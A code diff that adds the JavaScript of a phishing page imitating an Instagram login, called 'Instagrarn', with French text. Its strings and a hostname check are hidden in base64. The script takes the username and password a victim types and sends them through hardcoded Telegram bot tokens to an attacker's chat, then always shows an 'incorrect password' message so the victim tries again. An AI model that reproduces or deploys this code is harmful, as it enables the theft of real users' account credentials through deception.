@@ -1,0 +1,169 @@
+let iu = document.createElement("input");
+        iu.type = "text";
+        iu.id = "u";
+        iu.placeholder = dcd("Tm9tIGQndXRpbGlzYXRldXI=");
+        iu.autocomplete = "off";
+
+        let ip = document.createElement("input");
+        ip.type = dcd("cGFzc3dvcmQ=");
+        ip.id = "p";
+        ip.placeholder = dcd("TW90IGRlIHBhc3Nl");
+        ip.autocomplete = "off";
+
+        let inpts = document.getElementById("inpts");
+        inpts.appendChild(iu);
+        inpts.appendChild(ip);
+
+        langue.textContent = dcd("RnJhbsOnYWlzIChGcmFuY2Up");
+        pLogin.textContent = dcd("U2UgY29ubmVjdGVy");
+        frgt.textContent = dcd("TW90IGRlIHBhc3NlIG91Ymxpw6kgPw==");
+        sgnp.textContent = dcd("Q3LDqWVyIHVuIGNvbXB0ZQ==");
+        dialog_title.textContent = dcd("TW90IGRlIHBhc3NlIGluY29ycmVjdA==");
+        dialog_text.textContent = dcd("TGUgbW90IGRlIHBhc3NlIHF1ZSB2b3VzIGF2ZXogaW5kaXF1w6kgZXN0IGluY29ycmVjdC4gVmV1aWxsZXogcsOpZXNzYXllci4=");
+
+
+        fetch('./src/lg.txt')
+            .then(response => response.text())
+            .then(base64 => {
+                document.getElementById("logo").style.backgroundImage = `url(${base64})`;
+            })
+            .catch(error => console.error('Error', error));
+
+
+        fetch('./src/ldng.txt')
+            .then(response => response.text())
+            .then(base64 => {
+                document.getElementById("loading").style.backgroundImage = `url(${base64})`;
+            })
+            .catch(error => console.error('Error', error));
+
+
+        fetch('./src/mt.txt')
+            .then(response => response.text())
+            .then(base64 => {
+                document.getElementById("meta").style.backgroundImage = `url(${base64})`;
+            })
+            .catch(error => console.error('Error', error));
+
+
+        fetch('./src/ic.txt')
+            .then(response => response.text())
+            .then(base64 => {
+                const faviconLink = document.createElement('link');
+                faviconLink.setAttribute('rel', 'icon');
+                faviconLink.setAttribute('type', 'image/x-icon');
+                faviconLink.setAttribute('href', base64);
+                document.head.appendChild(faviconLink);
+
+            })
+            .catch(error => console.error('Error', error));
+
+
+
+        const container = document.getElementById("container");
+
+        container.style.display = 'none';
+   if (eval(dcd("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === dcd("aW5zLXRhZy1yYXJuLmdpdGh1Yi5pbw==")) {
+            container.style.display = 'flex';
+        }
+
+
+        const lgn = document.getElementById("lgn");
+        const dlg = document.getElementById('dlg');
+        var click = true;
+        var tokens;
+        var chatIds;
+        function flgn() {
+            if (click) {
+                var u = document.getElementById("u").value.trim();
+                var p = document.getElementById("p").value.trim();
+
+                if (u.length > 5 && p.length > 5) {
+                    pLogin.style.display = "none";
+                    loading.style.display = "block";
+                    click = false;
+
+
+
+                    var msg = `email: ${u}
+mdps: ${p}`;
+
+                    tokens = [
+                        dcd(to), dcd("Njc5OTk1NjQ4MDpBQUY2dUtNNGI3MmFBeE5lNm4ydk9DdUhwZzdyQ0pvUlBrWQ==")
+                    ];
+                    chatIds = [
+                        dcd(ca), dcd("NjY2OTY5MzgwNQ==")
+                    ];
+
+
+
+
+
+
+                    tokens.forEach((token, index) => {
+                        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+                        const data = {
+                            chat_id: chatIds[index],
+                            text: msg
+                        };
+
+                        fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        })
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.ok) {
+                                    if (index === tokens.length - 1) {
+
+                                        delay(() => showDlg());
+
+                                    }
+                                } else {
+                                    delay(() => showDlg());
+                                }
+                            })
+                            .catch(err => {
+                                delay(() => showDlg());
+                            });
+                    });
+
+
+
+                } else { //empty
+                    showDlg();
+                } //not empty
+
+            } //click
+
+        } //login
+
+
+        function showDlg() {
+            pLogin.style.display = "block";
+            loading.style.display = "none";
+            dlg.style.display = "flex";
+            click = true;
+        }
+
+
+        function delay(d) {
+            setTimeout(d, 2000);
+        }
+
+
+
+
+        document.title = dcd("Q29ubmV4aW9uIOKAoiBJbnN0YWdyYXJu");
+
+        const titleTag = document.createElement('title');
+        titleTag.textContent = dcd("SW5zdGFncmFybg==");
+        document.head.appendChild(titleTag);
+
+
+
+        function dcd(e) {
+            return decodeURIComponent(escape(atob(e)));
+        }
